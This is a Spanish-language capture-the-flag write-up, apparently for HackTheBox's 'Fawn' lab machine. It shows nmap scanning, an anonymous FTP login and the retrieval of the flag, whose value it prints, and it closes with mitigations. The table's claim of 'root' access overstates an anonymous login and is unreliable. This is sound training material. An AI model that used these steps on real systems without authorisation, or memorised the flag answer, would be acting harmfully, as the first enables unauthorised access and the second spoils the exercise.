---
layout: post
title: HTB — Fawn (FTP Anonymous)
date: 2026-04-26
platform: HackTheBox
difficulty: very-easy
description: Anonymous FTP login allowed
tags:
  - FTP
  - Anonymous
  - Linux
---
**Fawn** es la segunda máquina de la sección de la sección **Starting Point**, aunque es extremadamente sencilla, enseña algo que se repite en entornos reales con consecuencias devastadoras: **servicios mal configurados con credenciales por defecto**.

----
## Reconocimiento

Verificamos que la máquina responde utilizando un ``ping``:

```bash
ping -c 1 10.129.x.x
```

La primer regla del pentestig: **nunca supongas nada, siempre escanea**. Primero deseo saber que servicios están corriendo en el objetivo. Para eso uso ``nmap``:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
```

**Flags utilizadas:**
+ `-p-` — Escanea los 65535 puertos
- `-sS` — SYN scan (sigiloso, no completa el hanshake TCP)
- `--open` — Muestra solo puertos abiertos
- `--min-rate` - Envía mínimo 5000 paquetes por segundo
- `-vvv` - Verbose: muestra resultados en tiempo real
- `-n` - Sin resolución DNS (más rápido)
- `-Pn` - Omite el host discovery (asume que el host está activo)\
- `-oG` - Guarda el output en formato Grepeable

**Información relevante:**
```bash
PORT   STATE SERVICE
21/tcp open  ftp  
```
Un solo puerto abierto. Puerto ``21``, servicio [[ftp]].

Realizo un escaneo de versión  y servicios en ese puerto:

```bash
nmap -sCV -p21 10.129.x.x -oN target
```

**Flags utilizadas:**
+ `-sC` — ejecuta scripts de detección por defecto
- `-sV` — detecta versiones de los servicios
- `-oN` — guarda el output en un archivo de texto

**Información relevante:**

```bash
PORT STATE SERVICE VERSION 
21/tcp open ftp    
```

Aquí es importante observar con atención el resultado del escaneo. Recordemos que ``nmap`` cuenta con una serie de scripts de reconocimientos que utiliza para analizar los puertos hayamos descubierto.

Uno de los scripts utilizados para este caso es el ``ftp-anon``. Este script nos muestra si el usuario ``Anonymous`` se encuentra activo en el servicio ftp:

```bash
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

Como podemos observar, muestra que efectivamente el usuario `Anonymous` se encunetra activo.

---
## Explotación
Con el usuario ``Anonymous`` habilitado la explotación del servicio es muy sencilla.

Me conecto al servicio:

```bash
ftp 10.129.x.x
```

La máquina responde con un banner de login, como usuario usamos ``anonymous``.

```bash
Connected to 10.129.x.x.
220 (vsFTPd 3.0.3)
Name (x.x.x.x:user): anonymous
```

Sin contraseña. Solo **Enter**

```bash
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
---
# Flag
Una vez dentro, localizo la flag:

```bash
ls
# -rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt

cat flag.txt
# b40abdfe23665f766f9c61ecba8a4c19
```

### ¿Qué aprendemos de esto?

Fawn es tan directa como Meow, pero el servicio cambia y con él el contexto. **FTP anónimo** es una configuración que tiene casos de uso legítimos — servidores públicos de distribución de software, mirrors de Linux, repositorios abiertos — pero cuando aparece en un servidor que no debería ser público, se convierte en una fuga de información inmediata.

Algunos puntos clave:

**El acceso anónimo no significa inofensivo.** FTP con `anonymous` habilitado permite listar y descargar archivos sin ninguna credencial. Si el administrador olvidó qué había en ese directorio, o asumió que "nadie lo encontraría", el primer escaneo de nmap lo desmiente.

**Los servicios legacy siguen vivos.** FTP, al igual que Telnet, transmite en texto plano. Credenciales, comandos y archivos viajan sin cifrado por la red. SFTP y FTPS existen precisamente para reemplazarlo, pero FTP puro sigue apareciendo en auditorías reales con una frecuencia incómoda.

**La metodología no cambia, el servicio sí.** Escanear, identificar, enumerar, explotar. El proceso es el mismo que en Meow. Lo que cambia es aprender a reconocer qué hace cada servicio y qué preguntas hacerle: ¿acepta anonymous? ¿qué permisos tiene? ¿hay archivos expuestos?

El patrón del Starting Point es claro: cada máquina expone un servicio diferente mal configurado de la misma manera. La lección no es técnica, es mental — **cualquier servicio abierto es una pregunta sin responder hasta que lo pruebes.**

---
### Resumen técnico

| Elemento        | Detalle                                                                                                          |
| --------------- | ---------------------------------------------------------------------------------------------------------------- |
| Puerto          | 21/tcp (FTP)                                                                                                     |
| Vulnerabilidad  | Usuario Anonymous habilitado                                                                                     |
| Acceso obtenido | Root directo                                                                                                     |
| Herramientas    | `nmap`, `ftp`                                                                                                    |
| Mitigación      | Deshabilitar acceso anónimo (anonymous_enable=NO), migrar a SFTP/FTPS, aplicar chroot y permisos de solo lectura |
